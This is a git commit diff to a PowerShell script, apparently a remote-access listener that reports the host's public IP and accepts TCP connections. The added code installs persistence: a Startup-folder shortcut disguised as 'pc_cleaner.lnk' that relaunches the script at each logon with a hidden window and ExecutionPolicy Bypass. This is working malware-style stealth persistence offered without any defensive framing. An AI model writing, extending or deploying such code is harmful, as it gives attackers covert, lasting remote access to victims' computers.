85ba15625844919300b2f64522a0adaa28318d71
wxnnvs <136503688+wxnnvs@users.noreply.github.com>
2024-09-01 17:14:43 +0200

    add startup lnk

--- server.ps1
+++ server.ps1
@@ -9,6 +9,30 @@ $listener.Start()
 $pubIP = (Invoke-WebRequest -UseBasicParsing ifconfig.me/ip).Content.Trim()
 Write-Host "Server started at $($pubIP.ToString()):$port. Waiting for connections..."
 
+# Get the path of the Startup folder for the current user
+$StartupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
+# Get the full path of the script file
+$ScriptPath = $MyInvocation.MyCommand.Path
+# Define the path for the shortcut
+$ShortcutPath = [System.IO.Path]::Combine($StartupFolder, 'pc_cleaner.lnk') # Edit the filename to fit your needs
+
+# Check if the shortcut already exists
+if (Test-Path $ShortcutPath) {
+    Write-Host "Shortcut already exists: $ShortcutPath"
+} else {
+    # Create a WScript.Shell COM object
+    $WScriptShell = New-Object -ComObject WScript.Shell
+
+    # Create the shortcut
+    $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
+    $Shortcut.TargetPath = 'powershell.exe'
+    $Shortcut.Arguments = "-WindowStyle hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
+    $Shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($ScriptPath)
+    $Shortcut.Save()
+
+    Write-Host "Shortcut created in Startup folder: $ShortcutPath"
+}
+
 while ($true) {
     # Accept incoming client connection
     $client = $listener.AcceptTcpClient()
